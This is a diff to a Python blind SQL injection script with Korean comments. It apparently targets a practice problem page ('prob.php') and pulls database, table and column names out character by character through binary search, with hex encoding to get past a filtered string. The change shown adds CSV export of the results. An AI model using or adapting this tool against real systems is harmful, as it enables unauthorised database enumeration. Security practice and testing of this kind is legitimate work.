@@ -1,10 +1,12 @@
 #!/usr/bin/env python 3.8
 import requests
+import os
 
 VICTIM = 'http://test.mydomain.com/prob.php'  #진단할 URL
 PARAM = "pw"  # Blind SQL injection Payload를 포함할 파라미터
 BLIND_CHECK_STR = 'Hello admin'  # Blind SQL Injection 참/거짓을 판단할 텍스트
 FILTER_STR = 'hpcnt'
+FILEPATH = os.getcwd() + '/result/'
 
 
 # Blind Sql Injection 결과 출력하는 함수
@@ -22,6 +24,15 @@ def print_result(db_name, column_dict):
     print("{0:#^80}".format(""))
 
 
+def save_result(db_name, column_dict):
+    with open(FILEPATH + db_name + '.csv', encoding="utf-8", mode='w') as out:
+        cols = ['table_name', 'column_list']
+        out.write(','.join(cols) + "\n")
+        for table, columns in column_dict.items():
+            out.write(table + ',' + '/'.join(columns) + '\n')
+        print(FILEPATH + db_name + '.csv saved..')
+
+
 # DB 명, 테이블명, 컬럼 이름 중 필터링 되고 있는 문자열이 있으면 hex값으로 변환하는 함수
 # 예제에서는 hpcnt 문자열이 필터링 되고 있으므로 hex값을 이용해 우회 가능
 def check_filtering_str(checked_str, filter_str):
@@ -36,7 +47,6 @@ def check_filtering_str(checked_str, filter_str):
 def get_response(payload):
     params = {PARAM: payload}
     response = requests.get(VICTIM, params=params)
-
     return response
 
 
@@ -52,7 +62,6 @@ def has_blind_check_str(response):
 # ascii 코드로 알파벳 찾을 때 사용
 def binary_search(query, value_length):
     result = ''
-
     for i in range(1, value_length + 1):
         start = 0
         end = 127
@@ -177,10 +186,11 @@ def main():
         for table_name in tables_name:
             column_dict[table_name] = get_columns_name(table_name)
             print(column_dict[table_name])
-
         print("\n\n")
 
         print_result(db_name, column_dict)
+        save_result(db_name, column_dict)
+
     except OverflowError:
         print("Error : DB, Column, Table 이름의 길이가 예상보다 깁니다.")
     except ArithmeticError:
@@ -193,3 +203,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
